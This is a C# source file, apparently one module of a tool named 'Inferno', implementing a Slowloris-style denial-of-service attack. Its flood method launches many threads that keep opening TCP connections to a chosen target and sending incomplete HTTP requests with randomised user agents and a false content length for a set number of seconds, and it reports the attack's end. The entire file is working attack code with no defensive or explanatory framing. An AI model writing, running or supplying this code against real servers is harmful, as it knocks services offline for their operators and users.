using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Inferno
{
    internal class slowloris
    {

        // Output
        private static dynamic output = new System.Dynamic.ExpandoObject();

        // Threads list
        private static List<Thread> threadsList = new List<Thread>();

        // Send packet
        private static void send(string host, int seconds, int port = 80)
        {
            // host:port
            if (host.Contains(":"))
            {
                port = Int32.Parse(host.Split(':')[1]);
                host = host.Split(':')[0];
            }

            DateTime d = DateTime.Now.AddSeconds(seconds);
            while (DateTime.Compare(DateTime.Now, d) < 0)
            {
                Thread thread = new Thread(() =>
                {
                    Socket bot = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    bot.Connect(host, port);
                    if (bot.Connected)
                    {
                        bot.Send(ASCIIEncoding.ASCII.GetBytes("GET / HTTP/1.1\r\nHost: " + host + "\r\nUser-Agent: " + network.randomAgent() + "\r\nContent-length: 5235\r\n\r\n"), SocketFlags.None);
                        if (!bot.Connected) { bot.Connect(host, port); }
                    }
                });
                thread.Start();
            }
        }
        
        
        // DDOS
        public static void flood(string target, int threads, int seconds)
        {
            // Start threads
            for (int i = 0; i < threads; i++)
            {
                Thread thread = new Thread(() => send(target, seconds));
                thread.Start();
                threadsList.Add(thread);
            }

            // Wait for stop threads
            foreach (Thread thread in threadsList)
            {
                if (thread.IsAlive) { thread.Join(); }
            }

            // Show output
            output.target = target;
            output.threads = threads;
            output.seconds = seconds;
            core.Exit("SLOWLORIS flood attack stopped!", output);
        }

      

    }
}
